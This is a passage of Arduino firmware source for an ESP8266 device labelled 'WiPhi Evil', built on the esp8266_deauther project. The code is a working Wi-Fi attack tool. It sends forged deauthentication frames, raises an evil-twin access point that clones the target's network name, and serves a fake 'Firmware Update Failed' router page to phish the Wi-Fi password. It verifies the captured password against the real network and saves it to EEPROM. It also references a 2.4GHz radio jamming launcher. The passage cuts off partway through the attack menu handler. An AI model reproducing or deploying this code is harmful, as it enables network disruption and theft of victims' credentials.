/* =====================
   This software is licensed under the MIT License:
   https://github.com/spacehuhntech/esp8266_deauther
   ===================== */

extern "C" {
  #include "user_interface.h"
}

#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include <RF24.h>
#ifdef printf_P
#undef printf_P
#endif
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

#include "EEPROMHelper.h"

#include "src/ArduinoJson-v5.13.5/ArduinoJson.h"
#if ARDUINOJSON_VERSION_MAJOR != 5
#error Please upgrade/downgrade ArduinoJSON library to version 5!
#endif

#include "oui.h"
#include "language.h"
#include "functions.h"
#include "settings.h"
#include "Names.h"
#include "SSIDs.h"
#include "Scan.h"
#include "Attack.h"
#include "CLI.h"
#include "DisplayUI.h"
#include "A_config.h"

#define PIN_CE  16
#define PIN_CSN 15

// ============================================================
//  WiPhi EEPROM layout
//  Use a high offset to avoid clashing with deauther EEPROM area
// ============================================================
#define WIPHI_EE_BASE      2048
#define WIPHI_EE_MAGIC     0xAB
#define WIPHI_EE_MAGIC_ADDR (WIPHI_EE_BASE + 0)
#define WIPHI_EE_SLOTS     5
#define WIPHI_EE_SSID_LEN  32
#define WIPHI_EE_PW_LEN    64
#define WIPHI_EE_SLOT_SIZE (WIPHI_EE_SSID_LEN + WIPHI_EE_PW_LEN + 1)
#define WIPHI_EE_DATA_START (WIPHI_EE_BASE + 1)
#define WIPHI_EE_TOTAL     (1 + WIPHI_EE_SLOTS * WIPHI_EE_SLOT_SIZE + 4)

struct SavedPW {
    bool   valid;
    char   ssid[WIPHI_EE_SSID_LEN];
    char   pw[WIPHI_EE_PW_LEN];
};
Adafruit_SH1106G display = Adafruit_SH1106G(128, 64, &Wire, -1);

// ============================================================
//  WiPhi network struct
// ============================================================
typedef struct {
    String  ssid;
    uint8_t ch;
    uint8_t bssid[6];
    int32_t rssi;
} _Network;

// ============================================================
//  WiPhi UI States
// ============================================================
typedef enum {
    UI_SPLASH = 0,
    UI_MAIN_MENU,
    UI_SCANNING,
    UI_AP_LIST,
    UI_ATTACK_MENU,
    UI_RUNNING,
    UI_CAPTURED,
    UI_PW_LIST,
    UI_PW_DETAIL
} WiPhiUIState;

#define WIPHI_MAIN_ITEMS 5
const char* WIPHI_MAIN_LABELS[WIPHI_MAIN_ITEMS] = {
    "Scan Networks",
    "Select AP",
    "Attack",
    "Captured PW",
    "Saved Passwords"
};

#define WIPHI_ATK_ITEMS 4
const char* WIPHI_ATK_LABELS[WIPHI_ATK_ITEMS] = {
    "Deauth Only",
    "Deauth + EvilTwin",
    "Stop Attack",
    "Back"
};

// ============================================================
//  WiPhi globals
// ============================================================
_Network _wiphi_networks[16];
_Network _wiphi_selectedNetwork;
int      _wiphi_networkCount = 0;

const byte       WIPHI_DNS_PORT = 53;
const IPAddress  wiphi_apIP(192, 168, 4, 1);
DNSServer        wiphi_dnsServer;
ESP8266WebServer wiphi_webServer(80);

String _wiphi_correct     = "";
String _wiphi_tryPassword = "";
bool   wiphi_hotspot_active   = false;
bool   wiphi_deauthing_active = false;

unsigned long _wiphi_deauthNow   = 0;
unsigned long _wiphi_deauthCount = 0;

WiPhiUIState wiphi_ui_state = UI_SPLASH;
int wiphi_menuSel  = 0;
int wiphi_apSel    = 0;
int wiphi_atkSel   = 0;
int wiphi_pwSel    = 0;
bool wiphi_started = false;

// ============================================================
//  Launcher
// ============================================================
struct NrfMode {
    const char* label;
    void (*init)();
    void (*tick)();
    bool needsCarrier;
};

void nrfAttackAllInit();
void nrfAttackAllTick();
void nrfAttackWiFiInit();
void nrfAttackWiFiTick();

enum class AppMode {
    MAIN_MENU,
    NRF_MENU,
    NRF_RUNNING,
    DEAUTHER_SUITE,
    WIPHI_APP
};

// Run-Time Variables //
Names names;
SSIDs ssids;
Accesspoints accesspoints;
Stations     stations;
Scan   scan;
Attack attack;
CLI    cli;
DisplayUI displayUI;
RF24 radio(PIN_CE, PIN_CSN);

#include "wifi.h"

uint32_t autosaveTime = 0;
uint32_t currentTime  = 0;

bool booted = false;
bool deautherStarted = false;
bool nrfReady = false;
bool carrierActive = false;

AppMode appMode = AppMode::MAIN_MENU;
int mainSelected = 0;
int nrfSelected = 0;
int activeNrfMode = -1;

const byte NRF_CARRIER_CH = 45;
const int wifiChannels[] = { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 };
const int numWifiCh = sizeof(wifiChannels) / sizeof(wifiChannels[0]);

const char* MAIN_MENU_ITEMS[] = {
    "RF-Hunter",
    "Deauther-Suite",
    "WiPhi"
};
const int MAIN_MENU_COUNT = sizeof(MAIN_MENU_ITEMS) / sizeof(MAIN_MENU_ITEMS[0]);

const NrfMode NRF_MODES[] = {
    { "BLE & All 2.4GHz", nrfAttackAllInit,  nrfAttackAllTick,  true },
    { "Just Wi-Fi",       nrfAttackWiFiInit, nrfAttackWiFiTick, true },
};
const int NRF_MODE_COUNT = sizeof(NRF_MODES) / sizeof(NRF_MODES[0]);

void updateButtons();
void drawMainMenu();
void drawNrfMenu();
void drawNrfRunning();
void drawNrfBootScreen();
void drawNrfError();
bool setupNrfRadio();
void startNrfMode(int idx);
void stopNrfMode();
void startCarrier();
void stopCarrier();
void startDeautherSuite();
void startWiPhiApp();
void stopWiPhiApp();
void returnToMainMenu();
void updateMainMenu();
void updateNrfMenu();
void updateNrfRunning();
void updateDeautherSuite();
void updateWiPhiApp();

// WiPhi forward decls
void wiphi_drawSplash();
void wiphi_drawMainMenu();
void wiphi_drawScanningFrame(int p);
void wiphi_drawApList();
void wiphi_drawAttackMenu();
void wiphi_drawRunning();
void wiphi_drawCaptured();
void wiphi_drawPwList();
void wiphi_drawPwDetail(int slot);
void wiphi_titleBar(const char* t);
void wiphi_menuItem(int y, bool sel, const char* label);
void wiphi_performScan();
void wiphi_startDeauth();
void wiphi_stopDeauth();
void wiphi_startEvilTwin();
void wiphi_stopEvilTwin();
void wiphi_tickDeauth();
String wiphi_bytesToStr(const uint8_t* b, uint32_t size);
String wiphi_header(String t);
String wiphi_indexPage();
void   wiphi_handleIndex();
void   wiphi_handleResult();
void   wiphi_handleAdmin();

// ============================================================
//  WiPhi EEPROM helpers
// ============================================================
void wiphi_eeWriteSlot(int slot, const SavedPW& s) {
    int base = WIPHI_EE_DATA_START + slot * WIPHI_EE_SLOT_SIZE;
    EEPROM.write(base, s.valid ? 1 : 0);
    for (int i = 0; i < WIPHI_EE_SSID_LEN; i++) EEPROM.write(base + 1 + i, s.ssid[i]);
    for (int i = 0; i < WIPHI_EE_PW_LEN;   i++) EEPROM.write(base + 1 + WIPHI_EE_SSID_LEN + i, s.pw[i]);
    EEPROM.commit();
}

SavedPW wiphi_eeReadSlot(int slot) {
    SavedPW s;
    int base = WIPHI_EE_DATA_START + slot * WIPHI_EE_SLOT_SIZE;
    s.valid = (EEPROM.read(base) == 1);
    for (int i = 0; i < WIPHI_EE_SSID_LEN; i++) s.ssid[i] = EEPROM.read(base + 1 + i);
    for (int i = 0; i < WIPHI_EE_PW_LEN;   i++) s.pw[i]   = EEPROM.read(base + 1 + WIPHI_EE_SSID_LEN + i);
    s.ssid[WIPHI_EE_SSID_LEN - 1] = 0;
    s.pw[WIPHI_EE_PW_LEN - 1] = 0;
    return s;
}

void wiphi_eeDeleteSlot(int slot) {
    SavedPW empty;
    empty.valid = false;
    memset(empty.ssid, 0, WIPHI_EE_SSID_LEN);
    memset(empty.pw,   0, WIPHI_EE_PW_LEN);
    wiphi_eeWriteSlot(slot, empty);
}

int wiphi_eeSave(const char* ssid, const char* pw) {
    for (int i = 0; i < WIPHI_EE_SLOTS; i++) {
        SavedPW s = wiphi_eeReadSlot(i);
        if (!s.valid) {
            SavedPW n;
            n.valid = true;
            strncpy(n.ssid, ssid, WIPHI_EE_SSID_LEN - 1); n.ssid[WIPHI_EE_SSID_LEN - 1] = 0;
            strncpy(n.pw,   pw,   WIPHI_EE_PW_LEN   - 1); n.pw[WIPHI_EE_PW_LEN   - 1] = 0;
            wiphi_eeWriteSlot(i, n);
            return i;
        }
    }
    return -1;
}

// ============================================================
//  WiPhi display helpers — uses displayUI.display
// ============================================================
static inline void wiphi_setFontSmall() {
    displayUI.display.setFont(ArialMT_Plain_10);
}

void wiphi_titleBar(const char* title) {
    displayUI.display.fillRect(0, 0, 128, 12);
    displayUI.display.setColor(BLACK);
    int xpos = (128 - (int)strlen(title) * 6) / 2;
    if (xpos < 2) xpos = 2;
    displayUI.display.drawString(xpos, 1, title);
    displayUI.display.setColor(WHITE);
}

void wiphi_menuItem(int y, bool sel, const char* label) {
    char row[28];
    snprintf(row, sizeof(row), "%s %s", sel ? ">" : " ", label);
    displayUI.display.drawString(2, y, row);
}

void wiphi_drawSplash() {
    displayUI.display.clear();
    wiphi_setFontSmall();
    displayUI.display.drawString(34,  8, "Booting");
    displayUI.display.drawString(14, 22, "WiPhi Evil");
    displayUI.display.drawString(16, 36, "by @rdhrobotics");
    displayUI.display.display();
}

void wiphi_drawScanningFrame(int progress) {
    displayUI.display.clear();
    wiphi_setFontSmall();
    wiphi_titleBar("Scanning...");
    displayUI.display.drawString(14, 16, "Scanning WiFi...");
    displayUI.display.drawString(30, 30, "Please wait");
    displayUI.display.drawRect(10, 44, 108, 9);
    int fill = (progress * 106) / 100;
    if (fill > 0) displayUI.display.fillRect(11, 45, fill, 7);
    displayUI.display.display();
}

void wiphi_drawMainMenu() {
    displayUI.display.clear();
    wiphi_setFontSmall();
    wiphi_titleBar("WiPhi");

    if (_wiphi_selectedNetwork.ssid != "") {
        displayUI.display.setColor(BLACK);
        String tag = _wiphi_selectedNetwork.ssid.substring(0, 8);
        displayUI.display.drawString(128 - (int)tag.length() * 6 - 2, 1, tag.c_str());
        displayUI.display.setColor(WHITE);
    }

    int visStart = 0;
    if (wiphi_menuSel >= 4) visStart = wiphi_menuSel - 3;

    for (int i = 0; i < 4; i++) {
        int idx = visStart + i;
        if (idx >= WIPHI_MAIN_ITEMS) break;
        wiphi_menuItem(13 + i * 13, idx == wiphi_menuSel, WIPHI_MAIN_LABELS[idx]);
    }

    if (visStart > 0)                       displayUI.display.drawString(122, 13, "^");
    if (visStart + 4 < WIPHI_MAIN_ITEMS)    displayUI.display.drawString(122, 52, "v");

    displayUI.display.display();
}

void wiphi_drawApList() {
    displayUI.display.clear();
    wiphi_setFontSmall();
    wiphi_titleBar("Select AP");

    if (_wiphi_networkCount == 0) {
        displayUI.display.drawString(8, 20, "No networks found.");
        displayUI.display.drawString(8, 34, "Scan first.");
        displayUI.display.display();
        return;
    }

    int visStart = 0;
    if (wiphi_apSel >= 4) visStart = wiphi_apSel - 3;

    for (int i = 0; i < 4; i++) {
        int idx = visStart + i;
        if (idx >= _wiphi_networkCount) break;
        int y   = 13 + i * 13;
        bool sel = (idx == wiphi_apSel);

        String ssid = _wiphi_networks[idx].ssid;
        if (ssid.length() > 13) ssid = ssid.substring(0, 12) + "~";

        char line[22];
        snprintf(line, sizeof(line), "%-13s c%d", ssid.c_str(), _wiphi_networks[idx].ch);
        wiphi_menuItem(y, sel, line);
    }

    if (visStart > 0)                        displayUI.display.drawString(122, 13, "^");
    if (visStart + 4 < _wiphi_networkCount)  displayUI.display.drawString(122, 52, "v");

    char cnt[8];
    snprintf(cnt, sizeof(cnt), "%d/%d", wiphi_apSel + 1, _wiphi_networkCount);
    displayUI.display.drawString(128 - (int)strlen(cnt) * 6 - 1, 55, cnt);

    displayUI.display.display();
}

void wiphi_drawAttackMenu() {
    displayUI.display.clear();
    wiphi_setFontSmall();
    wiphi_titleBar("Attack");

    char tgt[20];
    snprintf(tgt, sizeof(tgt), "->%.16s", _wiphi_selectedNetwork.ssid.c_str());
    displayUI.display.drawString(0, 13, tgt);

    for (int i = 0; i < WIPHI_ATK_ITEMS; i++) {
        wiphi_menuItem(24 + i * 10, i == wiphi_atkSel, WIPHI_ATK_LABELS[i]);
    }

    displayUI.display.display();
}

void wiphi_drawRunning() {
    displayUI.display.clear();
    wiphi_setFontSmall();
    wiphi_titleBar("Running");

    String mode;
    if (wiphi_deauthing_active && wiphi_hotspot_active) mode = "Deauth+EvilTwin";
    else if (wiphi_deauthing_active)                    mode = "Deauth Only";
    else if (wiphi_hotspot_active)                      mode = "EvilTwin Only";
    else                                                mode = "Idle";
    displayUI.display.drawString(0, 13, mode.c_str());

    char tgt[20];
    snprintf(tgt, sizeof(tgt), "->%.16s", _wiphi_selectedNetwork.ssid.c_str());
    displayUI.display.drawString(0, 24, tgt);

    char pkts[18];
    snprintf(pkts, sizeof(pkts), "Pkts: %lu", _wiphi_deauthCount);
    displayUI.display.drawString(0, 35, pkts);

    if (_wiphi_correct != "") {
        displayUI.display.drawString(0, 46, "!! PW CAPTURED !!");
    } else if (wiphi_hotspot_active) {
        char cli[20];
        snprintf(cli, sizeof(cli), "Clients: %d", WiFi.softAPgetStationNum());
        displayUI.display.drawString(0, 46, cli);
    }

    displayUI.display.display();
}

void wiphi_drawCaptured() {
    displayUI.display.clear();
    wiphi_setFontSmall();
    wiphi_titleBar("Captured!");

    if (_wiphi_correct == "") {
        displayUI.display.drawString(4, 18, "No password yet.");
        displayUI.display.drawString(4, 32, "Run Deauth+EvilTwin");
        displayUI.display.drawString(4, 46, "and wait.");
    } else {
        int sep = _wiphi_correct.lastIndexOf(": ");
        String pw = (sep >= 0) ? _wiphi_correct.substring(sep + 2) : _wiphi_correct;

        char net[22];
        snprintf(net, sizeof(net), "Net:%.14s", _wiphi_selectedNetwork.ssid.c_str());
        displayUI.display.drawString(0, 13, net);
        displayUI.display.drawLine(0, 24, 128, 24);
        displayUI.display.drawString(0, 26, "Password:");

        if (pw.length() > 14) {
            displayUI.display.drawString(4, 37, pw.substring(0, 14).c_str());
            displayUI.display.drawString(4, 49, pw.substring(14, 27).c_str());
        } else {
            displayUI.display.drawString(4, 37, pw.c_str());
        }
    }

    displayUI.display.display();
}

void wiphi_drawPwList() {
    displayUI.display.clear();
    wiphi_setFontSmall();
    wiphi_titleBar("Saved PWs");

    int count = 0;
    for (int i = 0; i < WIPHI_EE_SLOTS; i++) {
        SavedPW s = wiphi_eeReadSlot(i);
        int y     = 13 + i * 10;
        bool sel  = (i == wiphi_pwSel);

        char row[22];
        if (s.valid) {
            snprintf(row, sizeof(row), "%.14s", s.ssid);
            count++;
        } else {
            snprintf(row, sizeof(row), "(empty)");
        }
        wiphi_menuItem(y, sel, row);
    }

    if (count == 0) {
        displayUI.display.drawString(8, 32, "No saved passwords.");
    }

    displayUI.display.display();
}

void wiphi_drawPwDetail(int slot) {
    displayUI.display.clear();
    wiphi_setFontSmall();
    SavedPW s = wiphi_eeReadSlot(slot);
    wiphi_titleBar("Password");

    if (!s.valid) {
        displayUI.display.drawString(8, 24, "(empty slot)");
        displayUI.display.display();
        return;
    }

    char net[22];
    snprintf(net, sizeof(net), "Net:%.14s", s.ssid);
    displayUI.display.drawString(0, 13, net);
    displayUI.display.drawLine(0, 24, 128, 24);

    displayUI.display.drawString(0, 26, "PW:");
    String pw = String(s.pw);
    if (pw.length() > 14) {
        displayUI.display.drawString(4, 36, pw.substring(0, 14).c_str());
        displayUI.display.drawString(4, 47, pw.substring(14, 27).c_str());
    } else {
        displayUI.display.drawString(4, 36, pw.c_str());
    }

    displayUI.display.drawString(72, 55, "[DEL=BACK]");

    displayUI.display.display();
}

// ============================================================
//  WiPhi network/attack helpers
// ============================================================
void wiphi_performScan() {
    wifi_promiscuous_enable(0);
    WiFi.disconnect();
    delay(100);
    wiphi_drawScanningFrame(0);

    int n = WiFi.scanNetworks(false);

    for (int i = 0; i < 16; i++) {
        _wiphi_networks[i].ssid = "";
        _wiphi_networks[i].ch   = 0;
        _wiphi_networks[i].rssi = 0;
        memset(_wiphi_networks[i].bssid, 0, 6);
    }
    _wiphi_networkCount = 0;

    if (n > 0) {
        _wiphi_networkCount = min(n, 16);
        for (int i = 0; i < _wiphi_networkCount; i++) {
            _wiphi_networks[i].ssid = WiFi.SSID(i);
            _wiphi_networks[i].ch   = WiFi.channel(i);
            _wiphi_networks[i].rssi = WiFi.RSSI(i);
            for (int j = 0; j < 6; j++)
                _wiphi_networks[i].bssid[j] = WiFi.BSSID(i)[j];
            wiphi_drawScanningFrame(10 + (i * 90) / max(_wiphi_networkCount, 1));
        }
    }

    wiphi_drawScanningFrame(100);
    delay(300);
    wifi_promiscuous_enable(1);
}

void wiphi_startDeauth() { wiphi_deauthing_active = true;  _wiphi_deauthCount = 0; _wiphi_deauthNow = 0; }
void wiphi_stopDeauth()  { wiphi_deauthing_active = false; }

void wiphi_startEvilTwin() {
    wiphi_hotspot_active = true;
    wiphi_dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(wiphi_apIP, wiphi_apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(_wiphi_selectedNetwork.ssid.c_str());
    wiphi_dnsServer.start(WIPHI_DNS_PORT, "*", wiphi_apIP);
}

void wiphi_stopEvilTwin() {
    wiphi_hotspot_active = false;
    wiphi_dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(wiphi_apIP, wiphi_apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("WiPhi_34732", "d347h320");
    wiphi_dnsServer.start(WIPHI_DNS_PORT, "*", wiphi_apIP);
}

void wiphi_tickDeauth() {
    if (!wiphi_deauthing_active || millis() - _wiphi_deauthNow < 200) return;
    wifi_set_channel(_wiphi_selectedNetwork.ch);
    uint8_t pkt[26] = {
        0xC0,0x00,0x00,0x00,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x01,0x00
    };
    memcpy(&pkt[10], _wiphi_selectedNetwork.bssid, 6);
    memcpy(&pkt[16], _wiphi_selectedNetwork.bssid, 6);
    pkt[24] = 1;
    pkt[0] = 0xC0; wifi_send_pkt_freedom(pkt, 26, 0);
    pkt[0] = 0xA0; wifi_send_pkt_freedom(pkt, 26, 0);
    _wiphi_deauthCount++;
    _wiphi_deauthNow = millis();
}

// ============================================================
//  WiPhi Web UI
// ============================================================
String wiphi_bytesToStr(const uint8_t* b, uint32_t size) {
    String str;
    for (uint32_t i = 0; i < size; i++) {
        if (b[i] < 0x10) str += '0';
        str += String(b[i], HEX);
        if (i < size - 1) str += ':';
    }
    return str;
}

#define WIPHI_WEB_SUBTITLE "ACCESS POINT RESCUE MODE"
#define WIPHI_WEB_TITLE    "<span style='color:yellow'>&#9888;</span> Firmware Update Failed"
#define WIPHI_WEB_BODY     "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String wiphi_header(String t) {
    String a = String(_wiphi_selectedNetwork.ssid);
    String CSS =
        "body{color:#333;font-family:'Century Gothic',sans-serif;font-size:18px;margin:0;padding:0}"
        "div{padding:0.5em}"
        "h1{font-size:7vw;padding:0.5em}"
        "input{width:100%;padding:9px;margin:8px 0;box-sizing:border-box;border:1px solid #555;border-radius:10px}"
        "label{color:#333;display:block;font-style:italic;font-weight:bold}"
        "nav{background:#0066ff;color:#fff;padding:1em}"
        "nav b{display:block;font-size:1.5em;margin-bottom:0.5em}";
    return "<!DOCTYPE html><html><head><title>" + a + "</title>"
           "<meta name=viewport content='width=device-width,initial-scale=1'>"
           "<style>" + CSS + "</style></head>"
           "<body><nav><b>" + a + "</b>" + WIPHI_WEB_SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
}

String wiphi_indexPage() {
    return wiphi_header(WIPHI_WEB_TITLE) + "<div>" + WIPHI_WEB_BODY +
           "</div><div><form action='/' method=post>"
           "<label>WiFi password:</label>"
           "<input type=password name='password' minlength='8'>"
           "<input type=submit value=Continue></form></div></body></html>";
}

String _wiphi_adminTpl =
    "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{font-family:sans-serif;padding:8px}.w{max-width:500px;margin:auto}"
    "table,th,td{border:1px solid #ccc;border-collapse:collapse;padding:4px 8px}"
    "button{padding:6px 12px;margin:4px}.sel{background:#90ee90}"
    "h3{color:green}</style></head><body><div class='w'><h2>WiPhi</h2>"
    "<form style='display:inline' method='post' action='/?deauth={dv}'><button {dis}>{db}</button></form>"
    "<form style='display:inline' method='post' action='/?hotspot={hv}'><button {dis}>{hb}</button></form>"
    "<br><br><table><tr><th>SSID</th><th>Ch</th><th>RSSI</th><th></th></tr>";

void wiphi_buildAdmin(String& html) {
    for (int i = 0; i < 16; i++) {
        if (_wiphi_networks[i].ssid == "") break;
        String bs  = wiphi_bytesToStr(_wiphi_networks[i].bssid, 6);
        bool  isSel = (wiphi_bytesToStr(_wiphi_selectedNetwork.bssid, 6) == bs);
        html += "<tr><td>" + _wiphi_networks[i].ssid + "</td><td>" +
                String(_wiphi_networks[i].ch) + "</td><td>" + String(_wiphi_networks[i].rssi) + "</td><td>"
                "<form method='post' action='/?ap=" + bs + "'>"
                "<button class='" + String(isSel ? "sel" : "") + "'>" +
                String(isSel ? "Selected" : "Select") + "</button></form></td></tr>";
    }
    html.replace("{db}",  wiphi_deauthing_active ? "Stop Deauth"   : "Start Deauth");
    html.replace("{dv}",  wiphi_deauthing_active ? "stop"          : "start");
    html.replace("{hb}",  wiphi_hotspot_active   ? "Stop EvilTwin" : "Start EvilTwin");
    html.replace("{hv}",  wiphi_hotspot_active   ? "stop"          : "start");
    html.replace("{dis}", _wiphi_selectedNetwork.ssid == "" ? "disabled" : "");
    if (_wiphi_correct != "") html += "<h3>" + _wiphi_correct + "</h3>";
    html += "</table></div></body></html>";
}

void wiphi_handleResult() {
    if (WiFi.status() != WL_CONNECTED) {
        wiphi_webServer.send(200, "text/html",
            "<html><head><script>setTimeout(()=>location.href='/',4000)</script></head>"
            "<body><center><h2 style='color:red'>Wrong Password. Try again.</h2></center></body></html>");
    } else {
        _wiphi_correct = "PW for " + _wiphi_selectedNetwork.ssid + ": " + _wiphi_tryPassword;
        wiphi_eeSave(_wiphi_selectedNetwork.ssid.c_str(), _wiphi_tryPassword.c_str());
        wiphi_stopEvilTwin();
        wiphi_startEvilTwin();
        wiphi_ui_state = UI_CAPTURED;
        wiphi_drawCaptured();
    }
}

void wiphi_handleIndex() {
    if (wiphi_webServer.hasArg("ap")) {
        for (int i = 0; i < 16; i++)
            if (wiphi_bytesToStr(_wiphi_networks[i].bssid, 6) == wiphi_webServer.arg("ap"))
                _wiphi_selectedNetwork = _wiphi_networks[i];
    }
    if (wiphi_webServer.hasArg("deauth")) {
        if (wiphi_webServer.arg("deauth") == "start") wiphi_startDeauth();
        else                                          wiphi_stopDeauth();
    }
    if (wiphi_webServer.hasArg("hotspot")) {
        if (wiphi_webServer.arg("hotspot") == "start") wiphi_startEvilTwin();
        else                                            wiphi_stopEvilTwin();
        return;
    }
    if (wiphi_hotspot_active) {
        if (wiphi_webServer.hasArg("password")) {
            _wiphi_tryPassword = wiphi_webServer.arg("password");
            delay(300);
            WiFi.disconnect();
            WiFi.begin(_wiphi_selectedNetwork.ssid.c_str(), _wiphi_tryPassword.c_str(),
                       _wiphi_selectedNetwork.ch, _wiphi_selectedNetwork.bssid);
            wiphi_webServer.send(200, "text/html",
                "<html><head><script>setTimeout(()=>location.href='/result',15000)</script></head>"
                "<body><center><h2>Verifying... please wait</h2>"
                "<progress value='10' max='100'></progress></center></body></html>");
        } else {
            wiphi_webServer.send(200, "text/html", wiphi_indexPage());
        }
    } else {
        String html = _wiphi_adminTpl;
        wiphi_buildAdmin(html);
        wiphi_webServer.send(200, "text/html", html);
    }
}

void wiphi_handleAdmin() {
    if (wiphi_webServer.hasArg("ap")) {
        for (int i = 0; i < 16; i++)
            if (wiphi_bytesToStr(_wiphi_networks[i].bssid, 6) == wiphi_webServer.arg("ap"))
                _wiphi_selectedNetwork = _wiphi_networks[i];
    }
    if (wiphi_webServer.hasArg("deauth")) {
        if (wiphi_webServer.arg("deauth") == "start") wiphi_startDeauth();
        else                                          wiphi_stopDeauth();
    }
    if (wiphi_webServer.hasArg("hotspot")) {
        if (wiphi_webServer.arg("hotspot") == "start") wiphi_startEvilTwin();
        else                                            wiphi_stopEvilTwin();
        return;
    }
    String html = _wiphi_adminTpl;
    wiphi_buildAdmin(html);
    wiphi_webServer.send(200, "text/html", html);
}

// ============================================================
//  WiPhi start/stop/update
// ============================================================
void startWiPhiApp() {
    appMode = AppMode::WIPHI_APP;
    displayUI.mode = DISPLAY_MODE::OFF;

    // Initialize WiPhi EEPROM area (only first time)
    if (EEPROM.read(WIPHI_EE_MAGIC_ADDR) != WIPHI_EE_MAGIC) {
        EEPROM.write(WIPHI_EE_MAGIC_ADDR, WIPHI_EE_MAGIC);
        for (int i = 0; i < WIPHI_EE_SLOTS; i++) wiphi_eeDeleteSlot(i);
        EEPROM.commit();
    }

    // Splash
    wiphi_drawSplash();
    delay(1200);

    // WiFi setup
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAPConfig(wiphi_apIP, wiphi_apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("WiPhi_34732", "d347h320");
    wiphi_dnsServer.start(WIPHI_DNS_PORT, "*", wiphi_apIP);

    wiphi_webServer.on("/",       wiphi_handleIndex);
    wiphi_webServer.on("/result", wiphi_handleResult);
    wiphi_webServer.on("/admin",  wiphi_handleAdmin);
    wiphi_webServer.onNotFound(wiphi_handleIndex);
    wiphi_webServer.begin();

    wiphi_performScan();
    wiphi_apSel = 0;
    wifi_promiscuous_enable(1);

    wiphi_ui_state = UI_MAIN_MENU;
    wiphi_menuSel  = 0;
    wiphi_started = true;
    wiphi_drawMainMenu();
}

void stopWiPhiApp() {
    wiphi_stopDeauth();
    wiphi_hotspot_active = false;
    wiphi_dnsServer.stop();
    wiphi_webServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    wifi_promiscuous_enable(0);
    wiphi_started = false;
    _wiphi_correct = "";
    _wiphi_tryPassword = "";
}

void updateWiPhiApp() {
    wiphi_dnsServer.processNextRequest();
    wiphi_webServer.handleClient();
    wiphi_tickDeauth();

    updateButtons();
    if (!displayUI.upBtn) return;

    // Long-hold BACK to exit to launcher main menu
    if (displayUI.backHolding(5000)) {
        stopWiPhiApp();
        returnToMainMenu();
        return;
    }

    switch (wiphi_ui_state) {

    case UI_MAIN_MENU: {
        bool chg = false;
        if (displayUI.upBtn->clicked())   { wiphi_menuSel = (wiphi_menuSel + WIPHI_MAIN_ITEMS - 1) % WIPHI_MAIN_ITEMS; chg = true; }
        if (displayUI.downBtn->clicked()) { wiphi_menuSel = (wiphi_menuSel + 1) % WIPHI_MAIN_ITEMS;                    chg = true; }
        if (chg) wiphi_drawMainMenu();

        if (displayUI.enterBtn->clicked()) {
            switch (wiphi_menuSel) {
                case 0:
                    wiphi_performScan();
                    wiphi_apSel = 0;
                    {
                        displayUI.display.clear();
                        wiphi_setFontSmall();
                        wiphi_titleBar("WiPhi");
                        char found[24];
                        snprintf(found, sizeof(found), "Found %d network%s",
                                 _wiphi_networkCount, _wiphi_networkCount == 1 ? "" : "s");
                        displayUI.display.drawString(10, 26, found);
                        displayUI.display.display();
                        delay(900);
                    }
                    wiphi_ui_state = UI_MAIN_MENU;
                    wiphi_drawMainMenu();
                    break;

                case 1:
                    wiphi_apSel    = 0;
                    wiphi_ui_state = UI_AP_LIST;
                    wiphi_drawApList();
                    break;

                case 2:
                    if (_wiphi_selectedNetwork.ssid == "") {
                        displayUI.display.clear();
                        wiphi_setFontSmall();
                        wiphi_titleBar("WiPhi");
                        displayUI.display.drawString(8, 22, "No AP selected.");
                        displayUI.display.drawString(8, 36, "Use Select AP first.");
                        displayUI.display.display();
                        delay(1600);
                        wiphi_drawMainMenu();
                    } else {
                        wiphi_atkSel   = 0;
                        wiphi_ui_state = UI_ATTACK_MENU;
                        wiphi_drawAttackMenu();
                    }
                    break;

                case 3:
                    wiphi_ui_state = UI_CAPTURED;
                    wiphi_drawCaptured();
                    break;

                case 4:
                    wiphi_pwSel    = 0;
                    wiphi_ui_state = UI_PW_LIST;
                    wiphi_drawPwList();
                    break;
            }
        }
    } break;

    case UI_AP_LIST: {
        bool chg = false;
        if (displayUI.upBtn->clicked())   { if (wiphi_apSel > 0) { wiphi_apSel--; chg = true; } }
        if (displayUI.downBtn->clicked()) { if (wiphi_apSel < _wiphi_networkCount - 1) { wiphi_apSel++; chg = true; } }
        if (chg) wiphi_drawApList();

        if (displayUI.enterBtn->clicked() && _wiphi_networkCount > 0) {
            _wiphi_selectedNetwork = _wiphi_networks[wiphi_apSel];
            displayUI.display.clear();
            wiphi_setFontSmall();
            wiphi_titleBar("Selected!");
            char s[20]; snprintf(s, sizeof(s), "%.18s", _wiphi_selectedNetwork.ssid.c_str());
            displayUI.display.drawString(4, 22, s);
            char c[16]; snprintf(c, sizeof(c), "Channel: %d", _wiphi_selectedNetwork.ch);
            displayUI.display.drawString(4, 36, c);
            displayUI.display.display();
            delay(900);
            wiphi_atkSel   = 0;
            wiphi_ui_state = UI_ATTACK_MENU;
            wiphi_drawAttackMenu();
        }
        if (displayUI.backBtn->clicked()) {
            wiphi_ui_state = UI_MAIN_MENU;
            wiphi_menuSel  = 1;
            wiphi_drawMainMenu();
        }
    } break;

    case UI_ATTACK_MENU: {
        bool chg = false;
        if (displayUI.upBtn->clicked())   { wiphi_atkSel = (wiphi_atkSel + WIPHI_ATK_ITEMS - 1) % WIPHI_ATK_ITEMS; chg = true; }
        if (displayUI.downBtn->clicked()) { wiphi_atkSel = (wiphi_atkSel + 1) % WIPHI_ATK_ITEMS;                    chg = true; }
        if (chg) wiphi_drawAttackMenu();

        if (displayUI.enterBtn->clicked()) {
            switch (wiphi_atkSel) {
